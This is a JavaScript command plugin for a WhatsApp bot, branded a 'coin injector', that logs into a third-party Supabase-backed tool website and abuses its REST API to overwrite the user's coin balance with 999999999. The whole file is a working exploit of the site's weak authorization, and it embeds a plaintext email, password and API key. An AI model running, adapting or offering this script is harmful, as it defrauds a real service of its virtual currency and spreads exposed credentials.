import axios from 'axios';

const CONFIG = {
    USERNAME: "TechGod@gmail.com",
    PASSWORD: "15012005",
    API_URL: "https://vnuturzxvxkjbkawgnpf.supabase.co",
    API_KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZudXR1cnp4dnhramJrYXdnbnBmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMTcxMzQsImV4cCI6MjA4NDU5MzEzNH0.v1pLqnN0VuYAeCSqKU3KEbGxam-hIc0md31WPhEiImQ",
    REFERER: "https://denki-toolweb.lovable.app/",
    TARGET_COINS: 999999999
};

const headers = {
    "accept": "*/*",
    "apikey": CONFIG.API_KEY,
    "content-type": "application/json",
    "Referer": CONFIG.REFERER
};

const handler = async (m, { conn }) => {
    let log = `🚀 *DENKI CORE INITIALIZED*\n\n`;
    
    // Send initial message and capture the key
    const { key } = await conn.sendMessage(m.chat, { text: log + `⏳ _Status: Authenticating..._` }, { quoted: m });

    try {
        // 1. LOGIN VERIFICATION
        const loginResp = await axios.post(
            `${CONFIG.API_URL}/auth/v1/token?grant_type=password`,
            {
                email: CONFIG.USERNAME,
                password: CONFIG.PASSWORD,
                gotrue_meta_security: {}
            },
            { headers }
        ).catch(e => { throw new Error(`Login Failed: ${e.response?.data?.error_description || e.message}`) });

        const token = loginResp.data.access_token;
        const userId = loginResp.data.user.id;
        const authHeaders = { ...headers, "Authorization": `Bearer ${token}` };
        
        log += `✅ Login Successful\n👤 User ID: \`${userId.slice(0,8)}\`\n`;
        await conn.sendMessage(m.chat, { text: log + `⏳ _Status: Fetching Adverts..._`, edit: key });

        // 2. AD CLICK VERIFICATION
        const adsResp = await axios.get(
            `${CONFIG.API_URL}/rest/v1/adverts?select=*&status=eq.approved&limit=2`,
            { headers: authHeaders }
        );
        const ads = adsResp.data || [];
        
        let clickCount = 0;
        for (let ad of ads) {
            try {
                await axios.get(
                    `${CONFIG.API_URL}/rest/v1/ad_clicks?select=id&user_id=eq.${userId}&advert_id=eq.${ad.id}`,
                    { headers: authHeaders }
                );
                clickCount++;
            } catch (e) { continue; }
        }
        
        log += `✅ Ads Processed: ${clickCount}/${ads.length}\n`;
        await conn.sendMessage(m.chat, { text: log + `⏳ _Status: Patching Coin Balance..._`, edit: key });

        // 3. COIN PATCH VERIFICATION
        await axios.patch(
            `${CONFIG.API_URL}/rest/v1/profiles?user_id=eq.${userId}`,
            { coins: CONFIG.TARGET_COINS },
            { headers: authHeaders }
        ).catch(e => { throw new Error(`Patch Failed: ${e.response?.statusText || e.message}`) });

        // 4. FINAL BALANCE CHECK
        const profileResp = await axios.get(
            `${CONFIG.API_URL}/rest/v1/profiles?select=coins&user_id=eq.${userId}`,
            { headers: authHeaders }
        );
        
        const finalCoins = profileResp.data[0]?.coins || 0;

        // --- SUCCESS FINAL REPORT ---
        log += `✅ Coins Updated: ${finalCoins.toLocaleString()}\n\n*PROTOCOL COMPLETE*`;
        
        await conn.sendMessage(m.chat, { 
            text: log,
            edit: key,
            contextInfo: {
                externalAdReply: {
                    title: `OMEGATECH COIN INJECTOR ✅`,
                    body: `Target: ${CONFIG.USERNAME}`,
                    mediaType: 1,
                    showAdAttribution: true
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363243543411475@newsletter',
                    newsletterName: `System Verified ✅`,
                }
            }
        });

    } catch (e) {
        log += `❌ *ERROR:* ${e.message}\n\n_Protocol Aborted._`;
        await conn.sendMessage(m.chat, { text: log, edit: key });
    }
};

handler.help = ['addcoins'];
handler.tags = ['owner'];
handler.command = /^(addcoins|denkifarm)$/i;

export default handler;